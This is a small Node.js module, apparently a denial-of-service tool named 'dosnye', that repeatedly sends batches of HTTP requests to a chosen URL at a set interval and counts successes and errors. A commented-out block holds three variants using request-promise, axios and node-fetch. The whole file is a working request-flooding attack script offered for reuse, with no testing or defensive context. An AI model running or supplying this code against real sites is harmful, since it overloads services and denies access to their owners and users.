const req = require('request')

const dosnye = (url, qty, ms) => {
    let err = ok = 0

    setInterval(_ => {

        for (let i = qty; i--;)
            req(url, error => !error ? ok++ : err++)

        console.log(`result:' ${ ok } ${ err }`)

        err = ok = 0

    }, ms)
}

module.exports = dosnye

// Variasi


/* 1
const request = require('request-promise');

const dosnye = async (url, qty, ms) => {
    let err = ok = 0;

    setInterval(async () => {
        for (let i = qty; i--;) {
            try {
                await request(url);
                ok++;
            } catch (error) {
                err++;
            }
        }

        console.log(`result: ${ok} ${err}`);

        err = ok = 0;
    }, ms);
};

module.exports = dosnye;










2

const axios = require('axios');

const dosnye = (url, qty, ms) => {
    let err = ok = 0;

    setInterval(async () => {
        for (let i = qty; i--;) {
            try {
                await axios.get(url);
                ok++;
            } catch (error) {
                err++;
            }
        }

        console.log(`result: ${ok} ${err}`);

        err = ok = 0;
    }, ms);
};

module.exports = dosnye;





3

const fetch = require('node-fetch');

const dosnye = (url, qty, ms) => {
    let err = ok = 0;

    setInterval(async () => {
        for (let i = qty; i--;) {
            try {
                await fetch(url);
                ok++;
            } catch (error) {
                err++;
            }
        }

        console.log(`result: ${ok} ${err}`);

        err = ok = 0;
    }, ms);
};

module.exports = dosnye;


*/